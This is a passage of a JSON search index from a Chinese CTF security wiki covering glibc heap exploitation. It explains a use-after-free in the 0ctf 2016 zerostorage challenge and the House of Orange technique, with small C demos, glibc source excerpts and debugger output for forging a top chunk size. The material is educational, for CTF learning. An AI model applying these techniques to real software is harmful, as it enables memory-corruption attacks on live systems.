        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#delete-4", 
            "text": "\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002  \u4e4b\u540e\u5c31\u662f\u5c06\u5143\u7d20\u5bf9\u5e94\u7684\u5b57\u6bb5\u5206\u522b\u8bbe\u7f6e\u4e3aNULL\uff0c\u5e76\u4e14\u91ca\u653e\u5bf9\u5e94\u7684\u5185\u5b58\u3002", 
            "title": "delete-4"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#view-5", 
            "text": "\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002  \u8f93\u5165\u5bf9\u5e94\u7684storage \u7684\u5185\u5bb9\u3002", 
            "title": "view-5"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#list-6", 
            "text": "\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002  \u904d\u5386\u6240\u6709\u6b63\u5728\u4f7f\u7528\u7684storage\uff0c\u8f93\u5165\u5176\u5bf9\u5e94\u7684\u4e0b\u6807\u4ee5\u53ca\u5bf9\u5e94storage\u7684\u5927\u5c0f\u3002", 
            "title": "list-6"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_10", 
            "text": "\u901a\u8fc7\u8fd9\u4e48\u7b80\u5355\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5 \u57fa\u672c\u786e\u5b9a\u6f0f\u6d1e\u4e3b\u8981\u5c31\u662f\u96c6\u4e2d\u5728insert\u64cd\u4f5c\u4e0emerge\u64cd\u4f5c\u4e2d\uff0c\u5c24\u5176\u662f\u5f53\u6211\u4eecmerge\u4e24\u4e2a\u8f83\u5c0fsize\u7684storage\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002  \u6211\u4eec\u6765\u5177\u4f53\u5206\u6790\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u5728insert\u8fc7\u7a0b\u4e2d\u63d2\u5165\u8f83\u5c0f\u7684size\uff08\u6bd4\u59828\uff09\u7684storage  A\uff0c\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u8fdb\u884cmerge\u65f6\uff0c\u5047\u8bbe\u6211\u4eec\u9009\u62e9merge\u7684\u4e24\u4e2astorage \u90fd\u4e3aA\uff0c\u90a3\u4e48\u6b64\u65f6\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u628a\u5c31\u4f1a\u76f4\u63a5\u628aA\u7684\u5185\u5bb9\u518d\u6dfb\u52a0\u5230A\u7684\u539f\u6709\u5185\u5bb9\u7684\u540e\u9762\uff0c\u7136\u540e\u63a5\u7740\u5c31\u4f1a\u628aA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5185\u5b58free\u6389\uff0c\u4f46\u662f\u8fd9\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u56e0\u4e3aA\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u88ab\u8d4b\u7ed9\u4e86\u53e6\u5916\u4e00\u4e2astorage\uff0c\u5f53\u518d\u8bbf\u95eemerge \u540e\u7684 storage B\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u7531\u4e8eB\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5730\u5740\u5176\u5b9e\u5c31\u662fA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6253\u5370\u7684\u5c31\u662fA\u7684\u6570\u636e\u90e8\u5206\u7684\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u521a\u521a\u628aA\u5bf9\u5e94\u7684\u5185\u5b58\u91ca\u653e\u6389\uff0c\u800cA\u7531\u4e8e\u4e0d\u5728fast bin\u8303\u56f4\u5185\uff0c\u6240\u4ee5\u53ea\u4f1a\u88ab\u653e\u5230unsorted bin\u4e2d\uff08\u800c\u4e14\u6b64\u65f6\u53ea\u6709\u4e00\u4e2a\uff09\uff0c\u6240\u4ee5\u6b64\u65f6A\u7684fd\u548cbk\u90fd\u5b58\u653e\u7684\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002  \u5982\u679c\u6211\u4eec\u5728merge\u4e4b\u524d\u66fe\u7ecf\u5220\u9664\u8fc7\u4e00\u4e2astorage C\uff0c\u90a3\u4e48\u5728\u6211\u4eecmerge A\u540e\uff0cA\u5c31\u4f1a\u63d2\u5728unsorted bin\u7684\u53cc\u5411\u94fe\u8868\u7684\u9996\u90e8\uff0c\u6240\u4ee5\u5176fd\u5219\u662fC\u5bf9\u5e94\u7684\u5730\u5740\uff0cbk\u5219\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\u3002  \u800c\u4e14\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u53bb\u4fee\u6539merge\u540e\u7684B\u7684\u5185\u5bb9\u7684\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e2aUse After Free\u3002", 
            "title": "\u6f0f\u6d1e\u786e\u5b9a"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_11", 
            "text": "\u3002\u3002\u3002\u3002", 
            "title": "\u5229\u7528\u6d41\u7a0b"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_12", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/unsorted_bin_attack/#_13", 
            "text": "http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/  https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage  https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/", 
            "text": "House of Orange\n\n\n\u4ecb\u7ecd\n\n\nHouse of Orange\u4e0e\u5176\u4ed6\u7684House of XX\u5229\u7528\u65b9\u6cd5\u4e0d\u540c\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u6765\u81ea\u4e8eHitcon CTF 2016\u4e2d\u7684\u4e00\u9053\u540c\u540d\u9898\u76ee\u3002\u7531\u4e8e\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u5728\u6b64\u524d\u7684CTF\u9898\u76ee\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fc7\uff0c\u56e0\u6b64\u4e4b\u540e\u51fa\u73b0\u7684\u4e00\u7cfb\u5217\u884d\u751f\u9898\u76ee\u7684\u5229\u7528\u65b9\u6cd5\u6211\u4eec\u79f0\u4e4b\u4e3aHouse of Orange\u3002\n\n\n\u6982\u8ff0\n\n\nHouse of Orange\u7684\u5229\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u9996\u5148\u9700\u8981\u76ee\u6807\u6f0f\u6d1e\u662f\u5806\u4e0a\u7684\u6f0f\u6d1e\u4f46\u662f\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u9898\u76ee\u4e2d\u4e0d\u5b58\u5728free\u51fd\u6570\u6216\u5176\u4ed6\u91ca\u653e\u5806\u5757\u7684\u51fd\u6570\u3002\u6211\u4eec\u77e5\u9053\u4e00\u822c\u60f3\u8981\u5229\u7528\u5806\u6f0f\u6d1e\uff0c\u9700\u8981\u5bf9\u5806\u5757\u8fdb\u884cmalloc\u548cfree\u64cd\u4f5c\uff0c\u4f46\u662f\u5728House of Orange\u5229\u7528\u4e2d\u65e0\u6cd5\u4f7f\u7528free\u51fd\u6570\uff0c\u56e0\u6b64House of Orange\u6838\u5fc3\u5c31\u662f\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u83b7\u5f97free\u7684\u6548\u679c\u3002\n\n\n\u539f\u7406\n\n\n\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\uff0cHouse of Orange\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u6ca1\u6709free\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5f97\u5230\u4e00\u4e2a\u91ca\u653e\u7684\u5806\u5757(unsorted bin)\u3002\n\u8fd9\u79cd\u64cd\u4f5c\u7684\u539f\u7406\u7b80\u5355\u6765\u8bf4\u662f\u5f53\u524d\u5806\u7684top chunk\u5c3a\u5bf8\u4e0d\u8db3\u4ee5\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u539f\u6765\u7684top chunk\u4f1a\u88ab\u91ca\u653e\u5e76\u88ab\u7f6e\u5165unsorted bin\u4e2d\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5728\u6ca1\u6709free\u51fd\u6570\u60c5\u51b5\u4e0b\u83b7\u53d6\u5230unsorted bins\u3002\n\n\n\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u6211\u4eec\u5047\u8bbe\u76ee\u524d\u7684top chunk\u5df2\u7ecf\u4e0d\u6ee1\u8db3malloc\u7684\u5206\u914d\u9700\u6c42\u3002\n\u9996\u5148\u6211\u4eec\u5728\u7a0b\u5e8f\u4e2d\u7684\nmalloc\n\u8c03\u7528\u4f1a\u6267\u884c\u5230libc.so\u7684\n_int_malloc\n\u51fd\u6570\u4e2d\uff0c\u5728\n_int_malloc\n\u51fd\u6570\u4e2d\uff0c\u4f1a\u4f9d\u6b21\u68c0\u9a8cfastbin\u3001small bins\u3001unsorted bin\u3001large bins\u662f\u5426\u53ef\u4ee5\u6ee1\u8db3\u5206\u914d\u8981\u6c42\uff0c\u56e0\u4e3a\u5c3a\u5bf8\u95ee\u9898\u8fd9\u4e9b\u90fd\u4e0d\u7b26\u5408\u3002\u63a5\u4e0b\u6765\n_int_malloc\n\u51fd\u6570\u4f1a\u8bd5\u56fe\u4f7f\u7528top chunk\uff0c\u5728\u8fd9\u91cctop chunk\u4e5f\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u7684\u8981\u6c42\uff0c\u56e0\u6b64\u4f1a\u6267\u884c\u5982\u4e0b\u5206\u652f\u3002\n\n\n/*\nOtherwise, relay to handle system-dependent cases\n*/\nelse {\n      void *p = sysmalloc(nb, av);\n      if (p != NULL \n __builtin_expect (perturb_byte, 0))\n    alloc_perturb (p, bytes);\n      return p;\n}\n\n\n\n\n\u6b64\u65f6ptmalloc\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u7533\u8bf7\u5806\u5185\u5b58\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u6267\u884csysmalloc\u6765\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u7a7a\u95f4\u3002\n\u4f46\u662f\u5bf9\u4e8e\u5806\u6765\u8bf4\u6709mmap\u548cbrk\u4e24\u79cd\u5206\u914d\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u8ba9\u5806\u4ee5brk\u7684\u5f62\u5f0f\u62d3\u5c55\uff0c\u4e4b\u540e\u539f\u6709\u7684top chunk\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u4e2d\u3002\n\n\n\u7efc\u4e0a\uff0c\u6211\u4eec\u8981\u5b9e\u73b0brk\u62d3\u5c55top chunk\uff0c\u4f46\u662f\u8981\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9blibc\u4e2d\u7684check\u3002\n\u9996\u5148\uff0cmalloc\u7684\u5c3a\u5bf8\u4e0d\u80fd\u5927\u4e8e\nmmp_.mmap_threshold\n\n\nif ((unsigned long)(nb) \n= (unsigned long)(mp_.mmap_threshold) \n (mp_.n_mmaps \n mp_.n_mmaps_max))\n\n\n\u5982\u679c\u6240\u9700\u5206\u914d\u7684 chunk \u5927\u5c0f\u5927\u4e8e mmap \u5206\u914d\u9608\u503c\uff0c\u9ed8\u8ba4\u4e3a 128K\uff0c\u5e76\u4e14\u5f53\u524d\u8fdb\u7a0b\u4f7f\u7528 mmap()\u5206\u914d\u7684\u5185\u5b58\u5757\u5c0f\u4e8e\u8bbe\u5b9a\u7684\u6700\u5927\u503c\uff0c\u5c06\u4f7f\u7528 mmap()\u7cfb\u7edf\u8c03\u7528\u76f4\u63a5\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002\n\n\n\u5728sysmalloc\u51fd\u6570\u4e2d\u5b58\u5728\u5bf9top chunk size\u7684check\uff0c\u5982\u4e0b\n\n\nassert((old_top == initial_top(av) \n old_size == 0) ||\n     ((unsigned long) (old_size) \n= MINSIZE \n\n      prev_inuse(old_top) \n\n      ((unsigned long)old_end \n pagemask) == 0));\n\n\n\u8fd9\u91cc\u68c0\u67e5\u4e86top chunk\u7684\u5408\u6cd5\u6027\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8c03\u7528\u672c\u51fd\u6570\uff0ctop chunk\u53ef\u80fd\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u53ef\u80fdold_size\u4e3a0\u3002\n\u5982\u679ctop chunk\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\uff0c\u90a3\u4e48top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u5927\u4e8e\u7b49\u4e8eMINSIZE\uff0c\u56e0\u4e3atop chunk\u4e2d\u5305\u542b\u4e86 fencepost\uff0c\u6240\u4ee5top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u8981\u5927\u4e8eMINSIZE\u3002\u5176\u6b21Top chunk\u5fc5\u987b\u6807\u8bc6\u524d\u4e00\u4e2achunk\u5904\u4e8einuse\u72b6\u6001\uff0c\u5e76\u4e14top chunk\u7684\u7ed3\u675f\u5730\u5740\u5fc5\u5b9a\u662f\u9875\u5bf9\u9f50\u7684\u3002\u6b64\u5916top chunk\u9664\u53bbfencepost\u7684\u5927\u5c0f\u5fc5\u5b9a\u8981\u5c0f\u4e8e\u6240\u9700chunk\u7684\u5927\u5c0f\uff0c\u5426\u5219\u5728_int_malloc()\u51fd\u6570\u4e2d\u4f1a\u4f7f\u7528top chunk\u5206\u5272\u51fachunk\u3002\n\n\n\u6211\u4eec\u603b\u7ed3\u4e00\u4e0b\u4f2a\u9020\u7684top chunk size\u7684\u8981\u6c42\n\n\n1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875\n\n\n2.size\u8981\u5927\u4e8eMINSIZE(0x10)\n\n\n3.size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size + MINSIZE(0x10)\n\n\n4.size\u7684prev inuse\u4f4d\u5fc5\u987b\u4e3a1\n\n\n\u4e4b\u540e\u539f\u6709\u7684top chunk\u5c31\u4f1a\u6267\u884c\n_int_free\n\u4ece\u800c\u987a\u5229\u8fdb\u5165unsorted bin\u4e2d\u3002\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e86\u4e00\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u6a21\u62df\u4e86\u4e00\u4e2a\u6ea2\u51fa\u8986\u76d6\u5230top chunk\u7684size\u57df\u3002\u6211\u4eec\u8bd5\u56fe\u628asize\u6539\u5c0f\u4ece\u800c\u5b9e\u73b0brk\u6269\u5c55\uff0c\u5e76\u628a\u539f\u6709\u7684top chunk\u653e\u5165unsorted bin\u4e2d\u3002\n\n\n#define fake_size 0x41\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size; // overwrite top chunk size\n\n    malloc(0x60);\n\n    malloc(0x60);\n}\n\n\n\u8fd9\u91cc\u6211\u4eec\u628atop chunk\u7684size\u8986\u76d6\u4e3a0x41\u3002\u4e4b\u540e\u7533\u8bf7\u5927\u4e8e\u8fd9\u4e2a\u5c3a\u5bf8\u7684\u5806\u5757\uff0c\u53730x60\u3002\n\u4f46\u662f\u5f53\u6211\u4eec\u6267\u884c\u8fd9\u4e2a\u793a\u4f8b\u65f6\u4f1a\u53d1\u73b0\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\uff0c\u539f\u56e0\u5728\u4e8eassert\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u4ece\u800c\u629b\u51fa\u4e86\u5f02\u5e38\u3002\n\n\n[#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6)\n[#1] 0x7ffff7a4402a \u2192 Name: __GI_abort()\n[#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150 \n(old_top == initial_top (av) \n old_size == 0) || ((unsigned long) (old_size) \n= MINSIZE \n prev_inuse (old_top) \n ((unsigned long) old_end \n (pagesize - 1)) == 0)\n, file=0x7ffff7b9ab85 \nmalloc.c\n, line=0x95a, function=0x7ffff7b9e998 \n__func__.11509\n \nsysmalloc\n)\n[#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 \nmain_arena\n)\n\n\n\n\n\u6b63\u786e\u7684\u793a\u4f8b\n\n\n\u6211\u4eec\u56de\u5934\u6765\u770b\u4e00\u4e0bassert\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u5217\u51fa\u7684\u6761\u76ee\u90fd\u88ab\u6ee1\u8db3\u4e86\u9664\u4e86\u7b2c\u4e00\u6761\u3002\n\n\n1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875\n\n\n\n\n\u4ec0\u4e48\u662f\u5bf9\u9f50\u5230\u5185\u5b58\u9875\u5462\uff1f\u6211\u4eec\u77e5\u9053\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u90fd\u662f\u4ee5\u5185\u5b58\u9875\u4e3a\u5355\u4f4d\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u4e00\u822c\u5185\u5b58\u9875\u7684\u5927\u5c0f\u662f4kb\u3002\u90a3\u4e48\u6211\u4eec\u4f2a\u9020\u7684size\u5c31\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u8fd9\u4e2a\u5c3a\u5bf8\u3002\u5728\u8986\u76d6\u4e4b\u524dtop chunk\u7684size\u5927\u5c0f\u662f20fe1\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u77e50x602020+0x20fe0=0x623000\u662f\u5bf9\u4e8e0x1000\uff084kb\uff09\u5bf9\u9f50\u7684\u3002\n\n\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n== top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u56e0\u6b64\u6211\u4eec\u4f2a\u9020\u7684fake_size\u53ef\u4ee5\u662f0x0fe1\u30010x1fe1\u30010x2fe1\u30010x3fe1\u7b49\u5bf94kb\u5bf9\u9f50\u7684size\u3002\u800c0x40\u4e0d\u6ee1\u8db3\u5bf9\u9f50\uff0c\u56e0\u6b64\u4e0d\u80fd\u5b9e\u73b0\u5229\u7528\u3002\n\n\n#define fake_size 0x1fe1\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size;\n\n    malloc(0x2000);\n\n    malloc(0x60);\n}\n\n\n\n\n\u8fdb\u884c\u5206\u914d\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230\u539f\u6765\u7684\u5806\u7ecf\u8fc7\u4e86brk\u6269\u5c55\n\n\n//\u539f\u6709\u7684\u5806\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n//\u7ecf\u8fc7\u6269\u5c55\u7684\u5806\n0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]\n\n\n\n\n\u6211\u4eec\u7684\u7533\u8bf7\u88ab\u5206\u914d\u52300x623010\u7684\u4f4d\u7f6e\uff0c\u540c\u65f6\u539f\u6709\u7684\u5806\u88ab\u7f6e\u5165unsorted bin\n\n\n[+] unsorted_bins[0]: fw=0x602020, bk=0x602020\n \u2192   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)\n\n\n\n\n\u56e0\u4e3aunsorted bin\u4e2d\u5b58\u5728\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u4e0b\u6b21\u7684\u5206\u914d\u4f1a\u5207\u5272\u8fd9\u4e2a\u5757\n\n\n malloc(0x60);\n 0x602030\n\n[+] unsorted_bins[0]: fw=0x602090, bk=0x602090\n \u2192   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u5185\u5b58\u662f\u4eceunsorted bin\u4e2d\u5207\u5272\u7684\uff0c\u5185\u5b58\u5e03\u5c40\u5982\u4e0b\n\n\n0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 \n== \u672a\u88ab\u6e05\u96f6\u7684unsorted bin\u94fe\u8868\n0x602040:   0x0000000000602020  0x0000000000602020\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000001f51 \n== \u5207\u5272\u5269\u4e0b\u7684\u65b0unsorted bin\n0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6020b0:   0x0000000000000000  0x0000000000000000\n\n\n\n\n\u5176\u5b9ehouse of orange\u7684\u8981\u70b9\u6b63\u5728\u4e8e\u6b64\uff0c\u4e4b\u540e\u7684\u5229\u7528\u56e0\u4e3a\u6d89\u53ca\u5230_IO_FILE\u7684\u77e5\u8bc6\uff0c\u653e\u5230IO_FILE\u72ec\u7acb\u7ae0\u8282\u5206\u4eab\u3002", 
            "title": "House of Orange"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#house-of-orange", 
            "text": "", 
            "title": "House of Orange"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_1", 
            "text": "House of Orange\u4e0e\u5176\u4ed6\u7684House of XX\u5229\u7528\u65b9\u6cd5\u4e0d\u540c\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u6765\u81ea\u4e8eHitcon CTF 2016\u4e2d\u7684\u4e00\u9053\u540c\u540d\u9898\u76ee\u3002\u7531\u4e8e\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u5728\u6b64\u524d\u7684CTF\u9898\u76ee\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fc7\uff0c\u56e0\u6b64\u4e4b\u540e\u51fa\u73b0\u7684\u4e00\u7cfb\u5217\u884d\u751f\u9898\u76ee\u7684\u5229\u7528\u65b9\u6cd5\u6211\u4eec\u79f0\u4e4b\u4e3aHouse of Orange\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_2", 
            "text": "House of Orange\u7684\u5229\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u9996\u5148\u9700\u8981\u76ee\u6807\u6f0f\u6d1e\u662f\u5806\u4e0a\u7684\u6f0f\u6d1e\u4f46\u662f\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u9898\u76ee\u4e2d\u4e0d\u5b58\u5728free\u51fd\u6570\u6216\u5176\u4ed6\u91ca\u653e\u5806\u5757\u7684\u51fd\u6570\u3002\u6211\u4eec\u77e5\u9053\u4e00\u822c\u60f3\u8981\u5229\u7528\u5806\u6f0f\u6d1e\uff0c\u9700\u8981\u5bf9\u5806\u5757\u8fdb\u884cmalloc\u548cfree\u64cd\u4f5c\uff0c\u4f46\u662f\u5728House of Orange\u5229\u7528\u4e2d\u65e0\u6cd5\u4f7f\u7528free\u51fd\u6570\uff0c\u56e0\u6b64House of Orange\u6838\u5fc3\u5c31\u662f\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u83b7\u5f97free\u7684\u6548\u679c\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_3", 
            "text": "\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\uff0cHouse of Orange\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u6ca1\u6709free\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5f97\u5230\u4e00\u4e2a\u91ca\u653e\u7684\u5806\u5757(unsorted bin)\u3002\n\u8fd9\u79cd\u64cd\u4f5c\u7684\u539f\u7406\u7b80\u5355\u6765\u8bf4\u662f\u5f53\u524d\u5806\u7684top chunk\u5c3a\u5bf8\u4e0d\u8db3\u4ee5\u6ee1\u8db3\u7533\u8bf7\u5206\u914d\u7684\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u539f\u6765\u7684top chunk\u4f1a\u88ab\u91ca\u653e\u5e76\u88ab\u7f6e\u5165unsorted bin\u4e2d\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5728\u6ca1\u6709free\u51fd\u6570\u60c5\u51b5\u4e0b\u83b7\u53d6\u5230unsorted bins\u3002  \u6211\u4eec\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u6211\u4eec\u5047\u8bbe\u76ee\u524d\u7684top chunk\u5df2\u7ecf\u4e0d\u6ee1\u8db3malloc\u7684\u5206\u914d\u9700\u6c42\u3002\n\u9996\u5148\u6211\u4eec\u5728\u7a0b\u5e8f\u4e2d\u7684 malloc \u8c03\u7528\u4f1a\u6267\u884c\u5230libc.so\u7684 _int_malloc \u51fd\u6570\u4e2d\uff0c\u5728 _int_malloc \u51fd\u6570\u4e2d\uff0c\u4f1a\u4f9d\u6b21\u68c0\u9a8cfastbin\u3001small bins\u3001unsorted bin\u3001large bins\u662f\u5426\u53ef\u4ee5\u6ee1\u8db3\u5206\u914d\u8981\u6c42\uff0c\u56e0\u4e3a\u5c3a\u5bf8\u95ee\u9898\u8fd9\u4e9b\u90fd\u4e0d\u7b26\u5408\u3002\u63a5\u4e0b\u6765 _int_malloc \u51fd\u6570\u4f1a\u8bd5\u56fe\u4f7f\u7528top chunk\uff0c\u5728\u8fd9\u91cctop chunk\u4e5f\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u7684\u8981\u6c42\uff0c\u56e0\u6b64\u4f1a\u6267\u884c\u5982\u4e0b\u5206\u652f\u3002  /*\nOtherwise, relay to handle system-dependent cases\n*/\nelse {\n      void *p = sysmalloc(nb, av);\n      if (p != NULL   __builtin_expect (perturb_byte, 0))\n    alloc_perturb (p, bytes);\n      return p;\n}  \u6b64\u65f6ptmalloc\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u7533\u8bf7\u5806\u5185\u5b58\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u6267\u884csysmalloc\u6765\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u7a7a\u95f4\u3002\n\u4f46\u662f\u5bf9\u4e8e\u5806\u6765\u8bf4\u6709mmap\u548cbrk\u4e24\u79cd\u5206\u914d\u65b9\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u8ba9\u5806\u4ee5brk\u7684\u5f62\u5f0f\u62d3\u5c55\uff0c\u4e4b\u540e\u539f\u6709\u7684top chunk\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u4e2d\u3002  \u7efc\u4e0a\uff0c\u6211\u4eec\u8981\u5b9e\u73b0brk\u62d3\u5c55top 